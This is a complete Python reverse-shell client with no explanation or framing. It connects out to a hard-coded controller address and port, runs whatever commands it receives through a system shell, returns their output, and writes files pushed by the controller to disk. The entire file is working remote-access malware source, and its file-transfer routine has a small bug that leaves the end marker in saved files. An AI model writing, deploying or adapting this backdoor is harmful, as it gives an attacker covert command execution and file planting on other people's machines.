import socket 
import subprocess
import os

def download_file(command):

    file_name = command[7:]
    file_bytes = b""

    sock.settimeout(1)

    while True:
        try:
            data = sock.recv(1024)
        except socket.timeout:
            break

        if file_bytes[-5:] == b"<END>":
            break
        else:
            file_bytes += data
    
    sock.settimeout(None)

    file = open(file_name,"wb")
    file.write(file_bytes)
    file.close()
    
if __name__ == '__main__':
    HOST = "192.168.1.102"
    PORT = 5555

    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((HOST,PORT))

    while True:
      
        command = sock.recv(1024).decode()
    
        if command[:6] == "upload":

            download_file(command)

        elif command[:2] == "cd":
            try:
                os.chdir(command[3:])
            except:
                pass 

        elif command == "exit":
            break
        else:
            try:
                result = b""
                result = subprocess.Popen([command],shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
                sock.sendall(result.stdout.read())
            except:
                pass
       
 

     



